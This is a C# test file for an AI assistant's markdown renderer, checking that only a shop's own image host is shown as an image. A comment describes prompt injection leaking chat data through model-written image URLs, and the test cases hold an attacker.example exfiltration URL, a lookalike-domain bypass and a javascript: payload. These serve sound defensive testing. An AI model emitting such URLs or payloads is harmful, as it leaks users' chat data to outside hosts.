using LouisAgent.Web.Shared.Text;
using LouisAgent.Web.Shared;

namespace LouisAgent.Api.Tests;

// F33, Louis: "can we have a product image". The cook shows a shop's product photo in its list, as a markdown image. A
// browser loads an image by itself, so a model-written image URL could carry the chat's data to any host (a prompt
// injection's way out). Only the shops' own image hosts render; any other image becomes a plain link, never loaded.
public class MarkdownImageTests
{
    private const string Chakalaka = "https://catalog.sixty60.co.za/v2/files/6a5f7a88745efcce53fcd220?width=256&height=256";

    [Test]
    public void AShopsProductImage_IsShown()
    {
        string html = Markdown.ToHtml($"| To buy |\n|---|\n| ![KOO Chakalaka]({Chakalaka}) KOO Chakalaka 410 g |").Value;

        Assert.That(html, Does.Contain("<img src=\"https://catalog.sixty60.co.za/v2/files/6a5f7a88745efcce53fcd220"));
    }

    // Louis: "when you click the product image the original must open in a modal". The list shows the 256 px thumbnail;
    // the photo carries the shop's original (the same file, no size asked), which chat.js opens in a dialog.
    [Test]
    public void AShopsProductImage_CarriesItsOriginal_ForTheModal()
    {
        string html = Markdown.ToHtml($"![KOO Chakalaka]({Chakalaka})").Value;

        Assert.That(html, Does.Contain("data-original=\"https://catalog.sixty60.co.za/v2/files/6a5f7a88745efcce53fcd220\""));
    }

    [TestCase("https://attacker.example/pixel.png?chat=secret")]
    [TestCase("http://catalog.sixty60.co.za/v2/files/1")]
    [TestCase("https://catalog.sixty60.co.za.attacker.example/x.png")]
    public void AnyOtherImage_IsALink_NeverLoaded(string url)
    {
        string html = Markdown.ToHtml($"![photo]({url})").Value;

        Assert.That(html, Does.Not.Contain("<img"));
        Assert.That(html, Does.Contain("<a href="), "still there to click, if the user wants it");
    }

    [Test]
    public void AnImageWithAScriptUrl_IsNeitherShownNorLinked()
    {
        string html = Markdown.ToHtml("![x](javascript:alert(1))").Value;

        Assert.That(html, Does.Not.Contain("<img").And.Not.Contain("javascript:"));
    }
}
